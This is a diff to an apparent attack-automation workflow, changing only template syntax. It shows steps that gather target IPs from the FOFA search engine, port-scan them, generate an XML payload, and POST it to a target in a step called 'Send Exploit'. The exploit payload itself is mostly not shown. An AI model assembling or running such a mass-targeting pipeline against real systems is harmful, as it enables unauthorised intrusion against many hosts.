@@ -423,11 +423,11 @@ jobs:
         script: |
           from ofx.api.search import FofaClient
           fofa = FofaClient()
-          results = fofa.search('${{ inputs.target_query }}', size=${{ inputs.max_targets }})
+          results = fofa.search('{{ inputs.target_query }}', size={{ inputs.max_targets }})
           targets = [r['ip'] for r in results]
           print(f"targets={','.join(targets)}")
         outputs:
-          targets: "${{ step.targets }}"
+          targets: "{{ step.targets }}"
       
       - name: Port Scan
         script: |
@@ -442,7 +442,7 @@ jobs:
               })
           print(f"scan_results={all_results}")
         outputs:
-          scan_results: "${{ step.scan_results }}"
+          scan_results: "{{ step.scan_results }}"
       
       - name: Service Detection
         script: |
@@ -479,15 +479,15 @@ jobs:
           print(f"payload={payload}")
           print(f"xml={xml}")
         outputs:
-          payload: "${{ step.payload }}"
-          xml: "${{ step.xml }}"
+          payload: "{{ step.payload }}"
+          xml: "{{ step.xml }}"
       
       - name: Send Exploit
         script: |
           import requests
           xml = '''{{ steps.0.outputs.xml }}'''
           response = requests.post(
-              '${{ inputs.target_url }}',
+              '{{ inputs.target_url }}',
               data=xml,
               headers={'Content-Type': 'application/xml'}
           )
